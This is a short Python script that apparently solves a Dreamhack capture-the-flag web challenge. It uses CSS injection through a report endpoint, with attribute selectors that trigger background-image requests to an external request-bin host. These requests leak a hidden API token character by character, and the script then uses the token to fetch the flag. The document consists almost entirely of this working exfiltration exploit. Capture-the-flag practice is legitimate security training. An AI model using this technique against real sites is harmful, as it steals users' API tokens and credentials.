# 1. Extract API-KEY
import requests
import string

port = 10829
url = f'http://host3.dreamhack.games:{port}/report'
bin = 'https://wenvomj.request.dreamhack.games'
API_KEY = ''

for char in string.ascii_lowercase:
    path = f"mypage?color=blue;}} input[id=InputApitoken][value^={API_KEY}{char}] {{background:url({bin}/{char})"

    res = requests.post(url, data={'path': path})
    print(char, res.status_code)


# 2. Get flag
port = 10829
url = f"http://host3.dreamhack.games:{port}/api/memo"
headers = {'API-KEY': 'yqudrjcgjskfrvqs'}
res = requests.get(url, headers=headers)
print(res.text)
